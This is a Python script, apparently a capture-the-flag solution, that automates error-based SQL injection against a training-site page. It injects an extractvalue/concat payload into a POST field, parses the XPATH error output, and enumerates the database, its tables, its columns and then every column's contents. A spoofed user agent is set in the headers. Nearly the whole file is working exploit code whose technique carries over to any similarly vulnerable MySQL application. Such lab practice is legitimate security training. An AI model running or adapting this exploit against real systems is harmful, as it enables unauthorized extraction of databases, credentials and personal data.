import requests
from user_agent import generate_user_agent
from bs4 import BeautifulSoup

base_url = 'http://ctf.segfaulthub.com:1020/sqlInjection4_1.php'
headers = {'User-Agent': generate_user_agent(os='win', device_type='desktop')}
query_params = {'query': ''}

def fetch_data(query, limit):
    results = []
    for index in range(limit):
        query_params['query'] = f"normaltic' and extractvalue('1',concat(0x3a, ({query} limit {index},1))) and '1'='1"
        response = requests.post(base_url, headers=headers, data=query_params)
        soup = BeautifulSoup(response.text, "html.parser")
        
        try:
            result = soup.find("div", {"class": "challenge-result"}).contents[0].strip() 
            if result != '존재하지 않는아이디입니다.':
                result = result.replace("XPATH syntax error: '", "").replace("'", "").replace(":", "")
                if result:  # 빈 값은 제외
                    results.append(result)
            else:
                break
        except AttributeError:
            break
    return results

def fetch_schemas():
    query = "select database()"
    return fetch_data(query, 3)

def fetch_tables(db_name):
    query = f"select table_name from information_schema.tables where table_schema='{db_name}'"
    return fetch_data(query, 4)

def fetch_columns(table_name, db_name):
    query = f"select column_name from information_schema.columns where table_name='{table_name}' and table_schema='{db_name}'"
    return fetch_data(query, 10)

def fetch_data_from_column(column_name, table_name, db_name):
    query = f"select {column_name} from {db_name}.{table_name}"
    return fetch_data(query, 10)

def fetch_all_data():
    # 모든 스키마, 테이블, 컬럼 데이터를 가져오는 메서드
    all_data = {}
    schemas = fetch_schemas()
    print("Schemas:", schemas)

    if schemas:
        for schema in schemas:
            if schema:  # 비어있지 않은 스키마에 대해 처리
                print(f"\nSchema: {schema}")
                tables = fetch_tables(schema)
                print(f"{schema}:", tables)
                
                for table in tables:
                    if table:  # 비어있지 않은 테이블에 대해 처리
                        print(f"\nTable: {table}")
                        columns = fetch_columns(table, schema)
                        print(f"{table}:", columns)
                        
                        for column in columns:
                            if column:  # 비어있지 않은 컬럼에 대해 처리
                                data = fetch_data_from_column(column, table, schema)
                                print(f"{column}:", data)
                                if data:  # 빈 데이터 제외
                                    all_data[(schema, table, column)] = data
    return all_data

if __name__ == "__main__":
    all_data = fetch_all_data()
    #print("\nAll Data:", all_data)